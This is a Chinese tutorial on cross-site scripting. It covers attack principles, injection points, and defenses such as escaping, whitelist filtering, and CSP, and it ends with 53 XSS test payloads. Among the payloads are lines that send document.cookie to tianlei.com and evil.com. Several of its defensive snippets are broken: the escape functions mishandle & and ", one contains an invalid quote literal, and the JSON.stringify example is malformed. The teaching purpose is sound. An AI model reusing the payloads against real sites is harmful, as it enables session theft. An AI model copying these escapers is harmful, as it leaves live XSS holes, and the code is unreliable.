> xss 是Cross Site Scripting（跨站脚本攻击）简称xss   
# xss攻击原理
> 渲染页面时，执行了攻击脚本
> **程序 + 数据 = 结果**
```
程序
<div>
#{content}
</div>

数据
content：
Hello World! <script>alert(123)</script>

结果
<div>
Hellow world!
<scirpt>alert(123)</script>
</div>
```
# xss攻击危害
- 获取页面数据
> 偷取用户数据，比如可以偷取用户的licence等
- 获取cookies
> 攻击者通过脚本可以获取cookies中的登录信息，比如token等
- 劫持前端逻辑
> 比如将一个按钮本来的a动作换成b动作
- 发送请求
> 偷取用户的信息及一些数据
```
如果攻击成功，网站会携带一个第三方的脚本文件。脚本文件内容就有可能是获取cookie数据。
<scirpt src = "http://www.tianlei.com/resouce/test.js"></script>
let script = document.createElement('script')
script.src = `http://www.tianlei.com/getDate?info=${encodeURIComponent(document.cookie)}`
```
## xss攻击后台管理系统
> 当后台数据来自前台，如果前台数据遭到攻击，数据进入到后台，攻击者就能获取到后台管理员的登录信息。进而对整个系统造成不可挽回的损失。
# xss分类
## 反射型
> url参数直接注入
## 存储型
> 存储到DB后读取时注入，相比于反射型危害更大  
# xss攻击注入点  
- HTML节点内容
```
<div>
#{content}
</div>
xss入侵后
<div>
<scirpt>alert(123)</script>
</div>
```
- HTML属性
```
<img src = "#{image}"/>
xss入侵后
<img src = " 1" onerror = "alert(1) "/> // 入侵代码为1" onerror = "alert(1)
```
- JavaScript代码
```
<script>
var data = "#{data}"
xss入侵后
var data = " hello";alert(1);" " // 入侵代码为hello";alert(1);"
</script>
```
- 富文本
> 富文本是由一段html构成，html的内容和属性就有xss攻击的风险  
```
<p style="color:red;">我们<span style="font-size:14px;">学习</span>xss<i>攻击</i></p>
```
# 浏览器自带防御方案
> X-XSS-Protection属性只适用于反射型xss攻击、只适用于html内容和html属性的攻击。对于js插入xss则不起作用
> 配置方法
```
response.setHeader({
    'X-XSS-Protection': 0 //0表示关闭浏览器校验，1表示开启，1; mode = block表示如果找到Xss，则不渲染文档
})
```
# xss防御和处理
- HTML节点内容的防御
```
<div>
<scirpt>alert(123)</script>
</div>
```
> 将script标记中的<和>替换成实体```&lt;```和```&gt;```
```
var encodeHtml = function (string) {
    if (!string) return string
    return string.replace(/[<>&"]/g, function (char) {
      return {
        '<': '&lt;',
        '>': '&gt;',
      }[char]
    })
  }
```
- HTML节点属性的防御
```
<img src = " 1" onerror = "alert(1) "/> // 入侵代码为1" onerror = "alert(1)
```
> 将注入的属性内容中的"和'进行转义
```
var encodeHtmlProperty = function (string) {
    if (!string) return string
    return string.replace(/[<>&"]/g, function (char) {
      return {
        '"': '&quot;',
        ''': '&apos;',//ie中不支持一般用 &#39; 代替
      }[char]
    })
  }
```
- js注入防御
> 用JSON.stringify函数进行防御
```
<script>
var data = JSON.stringify("hello";alert(1);"")
</script>
```
- 富文本xss防御
1. 使用黑名单方式进行过滤
    ```
    var xssFilter = function(html){
        if(!html) return ''
        html = html.replace(/<\s*\/?script\s*>/g,'')
        html = html.replace(/javascript:[^'"]*/g,'')
        ...onerror
        ...JavaScript:
        return html
    }
    ```
> 使用黑名单会有很多种情况，所以对于富文本的防御一般不使用黑名单，而是使用白名单  
2. 使用白名单进行过滤
> 按白名单对部分标签和属性进行保留  
```
//伪代码
var whiteList = {
    'img':['src'],
    'a':['href'],
}
var xssFilter = function(html){
        if(!html) return ''
        var nodeList =getElements(html)
       nodeList.forEach((element,index)=>{
            if(!~Object.keys(whiteList).indexOf(element.nodeName)){
                //去掉元素
                element.remove()
            }
            var attrs = element.attributes
            for(var i=0;i<attrs;i++){
                if(!~whiteList[element.nodeName].indexOf(attrs[i])){
                    //去掉属性
                   element.attr(attrs[i],null)
                }
            }
        })
    }
```
3. 使用第三方插件
> [js-xss](https://github.com/leizongmin/js-xss/blob/master/README.zh.md),需要使用可以点击链接查看官方文档
# CSP
> CSP是Content Security Policy的缩写，是web标准给出的解决xss攻击的内容安全策略，用于指定哪些内容可以执行
```
//在response头增加配置
response.setHeader({
    'Content-Security-Policy': default-src 'self'
})
//或者在meta增加配置
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">

//key
child-src: 指定iframe等子页面的策略
connect-src:表示ajax等的策略
default-src:如果其他指令没有指定，会默认使用这个策略
img-src:指定图片的策略
//value
<host-source>: 指定信任这个主机的资源
self: 同域可信任
unsafe-inline: 插入到页面的内容是否可信任
none：不信任
```
> 下面连接是CSP各个指令的解释[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid)
- report-ui打印浏览器安全策略具体信息
```
response.setHeader({
    'Content-Security-Policy': default-src 'self'; report-uri /report
})
```
> 如果设置了report-uri，浏览器就会多一个请求去汇报当前的安全策略  
![](https://github.com/shangguanhonglei/blog/blob/master/images/QQ20190624-220117@2x.png?raw=true)
> 如果希望只汇报不拦截可以使用Content-Security-Policy-Report-Only属性
```
response.setHeader({
    'Content-Security-Policy-Report-Only': "default-src 'self'; report-uri /report"
})
```
# php中防御xss
- 内置函数转义
```
strip_tags() //去掉html标签
htmlspecialchars() //对<>符号进行转义
```
- DOM解析白名单
> 内置DOMDocument类可以解析html字符串，然后根据白名单的方式进行过滤。
- 第三方库
> php又一个HTML Purifier库，具体用法参照库的官网
- CSP
> 参照上面CSP配置
```
response.setHeader({
    'Content-Security-Policy': script-src 'self'
})
```
# xss测试用例
> 几乎涵盖所有的测试用例
```
1.<script> alert(1);</script>

2.<script>alert('xss');</script>

3.<script  src="http://www.evil.com/cookie.php"></script>

4.<script>location.href="http://www.evil.com/cookies.php?cookie="+escape(document.cookie)"</script>

5.<scr<script>ipt>alert('xss');</scr</script>ipt>

6.<img src=liu.jpg onerror=alert(/xss/)/>

7.<style>@im\port'\ja\vasc\ript:alert(\"xss\")';</style>

8.<?echo('<src)'; echo('ipt>alert(\"xss\")';</script>');?>

9.<marquee><script>alert('xss')</script></marquee>

10.<IMG SRC=\"jav&#0x9;ascript:alert('xss');\">

11.<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

12."><script>alert(1)</script>

13.<script src=http://www.evil.com/files.js></script>

14.</title><script>alert(/xss/)</script>

15.</textarea><script>alert(/xss)</script>

16.<IMG LOWSRC=\"javascript:alert('XSS')\">

17.<IMG DYNSRC=\"javascript:alert('XSS')\">

18.<font style='color:expression(alert(document.cookie))'>

19.');alert('XSS

20.<img src="javascript:alert('XSS')">

21.[url=javascript:alert('XSS');]click me[/url]

22.<body onunload="javascript:alert('XSS');">

23.<body onLoad="alert('XSS');"

24.[color=red' onmouseover="alert('XSS')"]mouse over[/color]

25."/></a></><img src=1.gif onerror=alert(1)>

26.window.alert("XSS");

27.<div style="x:expression((window==1)?":eval('r=1;alert(String.fromCharCode(83,83,83));'))">

28.<iframe<?php eval chr(11)?>onload=alert('XSS')></iframe>

29."><script alert(String.fromCharCode(88,83,83))</script>

30.'>><marquee><h1>XSS<h1></marquee>

31.'">><script>alert('xss')</script>

32.'">><marquee><h1>XSS</h1></marquee>

33.<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">

34.<META HTTP-EQUIV=\"refresh\"CONTENT=\"0;URL=http://;url=javascript:alert('XSS');\">

35.<script>var var=1; alert(var)</script>

36.<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

37.<?='<SCRIPT>alert("XSS")</SCRIPT>'?>

38.<IMG SRC='vbscript:msgbox(\"XSS\")'>

39."onfocus=alert(document.domain)"><"

40.<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>

41.<STYLE>li {list-style-image:url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS

42.<br size=\"&{alert('xss')}\">

43.<scrscriptipt>alert(1)</scrscriptipt>

44."><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

45.[color=red width=expression(alert(123))][color]

46.<BASE HREF="javascript:alert('XSS');//">

47.Execute(MsgBox(chr(88)&&chr(83)&&chr(83)))<

48."></iframe><script>alert(123)</script>

49.<body onLoad="while(true) alert('XSS');">

50."<marquee><img src=k.png onerror=alert(/xss/) />

51.<div style="background:url('javascript:')

52.<img src='java\nscript:alert(\"XSS\")'>

53.>'"><img src="javascript:alert('xss')">
```


